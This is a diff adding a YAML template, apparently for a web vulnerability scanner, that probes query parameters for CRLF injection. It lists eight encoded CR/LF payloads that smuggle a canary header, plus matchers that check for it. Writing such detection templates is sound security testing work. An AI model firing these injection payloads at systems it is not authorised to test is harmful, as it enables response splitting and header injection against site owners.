@@ -1,0 +1,26 @@
+id: crlf
+info:
+  name: "CRLF Injection"
+  severity: medium
+  description: "Detects CRLF injection by injecting CR/LF sequences and checking for header injection"
+  tags: [crlf, injection, header]
+  author: Wired
+
+inject: query_params
+detection: header_check
+
+payloads:
+  - "%0d%0aInjected-Header:akemi-crlf"
+  - "%0aInjected-Header:akemi-crlf"
+  - "%0dInjected-Header:akemi-crlf"
+  - "%0d%0a%0d%0a<html>CRLF</html>"
+  - "%%0d0a%%0d0aInjected-Header:akemi-crlf"
+  - "%E5%98%8A%E5%98%8DInjected-Header:akemi-crlf"
+  - "%25%30%61Injected-Header:akemi-crlf"
+  - "\\r\\nInjected-Header:akemi-crlf"
+
+matchers:
+  headers:
+    Injected-Header: "akemi-crlf"
+  body_patterns:
+    - "akemi-crlf"
